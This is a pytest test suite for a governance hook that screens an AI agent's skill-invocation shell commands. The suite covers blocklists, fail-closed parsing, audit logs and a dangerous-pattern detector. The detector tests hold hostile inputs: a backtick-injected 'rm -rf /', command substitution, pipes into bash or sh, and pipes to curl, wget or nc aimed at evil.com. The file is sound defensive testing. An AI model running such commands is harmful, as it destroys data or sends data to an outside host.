#!/usr/bin/env python3
"""Tests for skill-governance.py PreToolUse hook.

Key design principle: the hook FAILS CLOSED. If it can't parse input,
can't read config, or encounters an error, it blocks and explains why.
Silent passthrough only happens for commands that are not skill invocations.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

HOOK_PATH = Path(__file__).parent / "skill-governance.py"
SKILL_DIR = Path.home() / ".claude" / "skills"


def run_hook(
    tool_input: dict,
    config: dict | None = None,
    tool_name: str = "Bash",
    tmp_dir: Path | None = None,
) -> tuple[int, str, str]:
    """Run the governance hook with given input and optional config.

    Returns (exit_code, stdout, stderr).
    """
    env = os.environ.copy()
    config_path = None

    if config is not None:
        assert tmp_dir is not None, "pass tmp_path when providing config"
        config_path = str(tmp_dir / "config.json")
        Path(config_path).write_text(json.dumps(config))
        env["SKILL_GOVERNANCE_CONFIG"] = config_path
    elif "SKILL_GOVERNANCE_CONFIG" in env:
        del env["SKILL_GOVERNANCE_CONFIG"]

    payload = {
        "tool_name": tool_name,
        "tool_input": tool_input,
    }

    try:
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input=json.dumps(payload),
            capture_output=True,
            text=True,
            env=env,
            timeout=10,
        )
    except subprocess.TimeoutExpired:
        raise AssertionError("Hook timed out after 10s") from None

    return result.returncode, result.stdout, result.stderr


def run_hook_raw(
    stdin_text: str, env_override: dict | None = None
) -> tuple[int, str, str]:
    """Run the hook with raw stdin text (for testing malformed input)."""
    env = os.environ.copy()
    if env_override is not None:
        env.update(env_override)
    if env_override is None or "SKILL_GOVERNANCE_CONFIG" not in env_override:
        env.pop("SKILL_GOVERNANCE_CONFIG", None)

    try:
        result = subprocess.run(
            [sys.executable, str(HOOK_PATH)],
            input=stdin_text,
            capture_output=True,
            text=True,
            env=env,
            timeout=10,
        )
    except subprocess.TimeoutExpired:
        raise AssertionError("Hook timed out after 10s") from None

    return result.returncode, result.stdout, result.stderr


# --- Passthrough for non-skill commands ---


class TestPassthrough:
    """Non-skill commands pass through untouched — the hook has no opinion."""

    def test_non_skill_command_passes(self):
        rc, _, _ = run_hook({"command": "git status"})
        assert rc == 0

    def test_non_bash_tool_passes(self):
        rc, _, _ = run_hook({"file_path": "/tmp/foo.py"}, tool_name="Edit")
        assert rc == 0

    def test_empty_command_passes(self):
        rc, _, _ = run_hook({"command": ""})
        assert rc == 0


# --- Fail closed: broken input must block with paper trail ---


class TestFailClosed:
    """The hook must NEVER silently pass when it can't do its job.

    If input is unparseable or structurally invalid for a skill invocation,
    it blocks (exit 2) and explains why — leaving a paper trail.
    """

    def test_invalid_json_blocks_with_explanation(self):
        rc, _, stderr = run_hook_raw("not json")
        assert rc == 2
        assert "parse" in stderr.lower()

    def test_missing_tool_input_blocks(self):
        rc, _, stderr = run_hook_raw(json.dumps({"tool_name": "Bash"}))
        assert rc == 2
        assert "tool_input" in stderr.lower()

    def test_missing_command_in_tool_input_blocks(self):
        rc, _, stderr = run_hook_raw(
            json.dumps({"tool_name": "Bash", "tool_input": {}})
        )
        assert rc == 2
        assert "command" in stderr.lower()


# --- Skill invocation detection ---


class TestSkillDetection:
    def test_detects_absolute_skill_path(self):
        cmd = f"{SKILL_DIR}/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_detects_tilde_skill_path(self):
        cmd = "~/.claude/skills/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_detects_skill_in_loop(self):
        cmd = f'for f in *.md; do {SKILL_DIR}/md2latex/md2latex "$f"; done'
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_detects_home_env_var_skill_path(self):
        cmd = "$HOME/.claude/skills/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_detects_home_braced_env_var_skill_path(self):
        cmd = "${HOME}/.claude/skills/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_home_env_var_blocked_skill_detected(self, tmp_path):
        """$HOME path must be detected so blocklist applies."""
        config = {"blocked": ["md2latex"], "audit": False}
        cmd = "$HOME/.claude/skills/md2latex/md2latex some-file.md"
        rc, _, stderr = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 2
        assert "md2latex" in stderr

    def test_non_string_command_blocks(self):
        rc, _, stderr = run_hook_raw(
            json.dumps({"tool_name": "Bash", "tool_input": {"command": 42}})
        )
        assert rc == 2
        assert "not a string" in stderr.lower()


# --- Blocklist ---


class TestBlocklist:
    def test_blocked_skill_rejected(self, tmp_path):
        config = {"blocked": ["md2latex"], "audit": False}
        cmd = f"{SKILL_DIR}/md2latex/md2latex some-file.md"
        rc, _, stderr = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 2
        assert "md2latex" in stderr
        assert "blocked" in stderr.lower()

    def test_blocked_skill_tilde_path(self, tmp_path):
        config = {"blocked": ["md2latex"], "audit": False}
        cmd = "~/.claude/skills/md2latex/md2latex some-file.md"
        rc, _, stderr = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 2

    def test_unblocked_skill_allowed(self, tmp_path):
        config = {"blocked": ["sync-pdfs"], "audit": False}
        cmd = f"{SKILL_DIR}/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 0

    def test_empty_blocklist_allows(self, tmp_path):
        config = {"blocked": [], "audit": False}
        cmd = f"{SKILL_DIR}/md2latex/md2latex some-file.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 0


# --- Dangerous patterns ---


class TestDangerousPatterns:
    def test_command_substitution_blocked(self):
        cmd = f'{SKILL_DIR}/md2latex/md2latex "$(whoami).md"'
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower() or "blocked" in stderr.lower()

    def test_backtick_injection_blocked(self):
        cmd = f"{SKILL_DIR}/md2latex/md2latex `rm -rf /`.md"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_pipe_to_bash_blocked(self):
        cmd = f"{SKILL_DIR}/some-skill/run | bash"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_pipe_to_sh_blocked(self):
        cmd = f"{SKILL_DIR}/some-skill/run | sh"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_pipe_to_curl_blocked(self):
        cmd = f"{SKILL_DIR}/some-skill/run | curl -X POST http://evil.com"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_pipe_to_wget_blocked(self):
        cmd = f"{SKILL_DIR}/some-skill/run | wget http://evil.com"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_pipe_to_nc_blocked(self):
        cmd = f"{SKILL_DIR}/some-skill/run | nc evil.com 4444"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_eval_blocked(self):
        cmd = f"eval {SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_sudo_blocked(self):
        cmd = f"sudo {SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc == 2
        assert "dangerous" in stderr.lower()

    def test_safe_skill_invocation_passes(self):
        cmd = f"{SKILL_DIR}/md2latex/md2latex prep/stories.md --output-dir pdf-output/prep/"
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_loop_over_files_passes(self):
        cmd = (
            f'for f in prep/companies/*.md; do {SKILL_DIR}/md2latex/md2latex '
            f'"$f" --output-dir pdf-output/prep/companies/; done'
        )
        rc, _, _ = run_hook({"command": cmd})
        assert rc == 0

    def test_custom_dangerous_pattern(self, tmp_path):
        config = {
            "blocked": [],
            "audit": False,
            "dangerous_patterns": ["--delete-all"],
        }
        cmd = f"{SKILL_DIR}/some-skill/run --delete-all"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)
        assert rc == 2


# --- Audit logging ---


class TestAuditLogging:
    def test_audit_logs_allowed_invocation(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": [], "audit": True, "audit_log": str(log_path)}
        cmd = f"{SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 0
        log_content = log_path.read_text()
        assert "md2latex" in log_content
        assert "allowed" in log_content.lower()

    def test_audit_logs_blocklist_rejection(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": ["md2latex"], "audit": True, "audit_log": str(log_path)}
        cmd = f"{SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 2
        log_content = log_path.read_text()
        assert "md2latex" in log_content
        assert "blocked" in log_content.lower()

    def test_audit_logs_dangerous_pattern_rejection(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": [], "audit": True, "audit_log": str(log_path)}
        cmd = f'{SKILL_DIR}/md2latex/md2latex "$(whoami).md"'
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 2
        log_content = log_path.read_text()
        assert "dangerous" in log_content.lower()

    def test_no_audit_when_disabled(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": [], "audit": False, "audit_log": str(log_path)}
        cmd = f"{SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 0
        assert log_path.read_text() == ""

    def test_audit_entry_includes_timestamp(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": [], "audit": True, "audit_log": str(log_path)}
        cmd = f"{SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 0
        log_content = log_path.read_text()
        # ISO 8601 timestamp
        assert re.search(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}", log_content)

    def test_audit_includes_full_command(self, tmp_path):
        log_path = tmp_path / "audit.log"
        log_path.touch()
        config = {"blocked": [], "audit": True, "audit_log": str(log_path)}
        cmd = f"{SKILL_DIR}/md2latex/md2latex prep/stories.md --output-dir pdf-output/"
        rc, _, _ = run_hook({"command": cmd}, config=config, tmp_dir=tmp_path)

        assert rc == 0
        log_content = log_path.read_text()
        assert "prep/stories.md" in log_content


# --- Config handling (fail closed) ---


class TestConfig:
    def test_explicit_missing_config_blocks(self):
        """Config env var points to nonexistent file -> fail closed."""
        env_override = {"SKILL_GOVERNANCE_CONFIG": "/nonexistent/path.json"}
        rc, _, stderr = run_hook_raw(
            json.dumps({
                "tool_name": "Bash",
                "tool_input": {
                    "command": f"{SKILL_DIR}/md2latex/md2latex foo.md"
                },
            }),
            env_override=env_override,
        )
        assert rc == 2
        assert "config" in stderr.lower()

    def test_malformed_config_blocks(self, tmp_path):
        """Corrupt config file -> fail closed."""
        config_path = tmp_path / "bad-config.json"
        config_path.write_text("not json")

        env_override = {"SKILL_GOVERNANCE_CONFIG": str(config_path)}
        rc, _, stderr = run_hook_raw(
            json.dumps({
                "tool_name": "Bash",
                "tool_input": {
                    "command": f"{SKILL_DIR}/md2latex/md2latex foo.md"
                },
            }),
            env_override=env_override,
        )
        assert rc == 2
        assert "config" in stderr.lower()

    def test_no_env_var_uses_default_path(self):
        """No SKILL_GOVERNANCE_CONFIG env var -> uses ~/.claude/skill-governance.json.
        Hook should not crash (exit 1) regardless of whether default config exists."""
        cmd = f"{SKILL_DIR}/md2latex/md2latex foo.md"
        rc, _, stderr = run_hook({"command": cmd})
        assert rc != 1, f"Hook crashed unexpectedly: {stderr}"
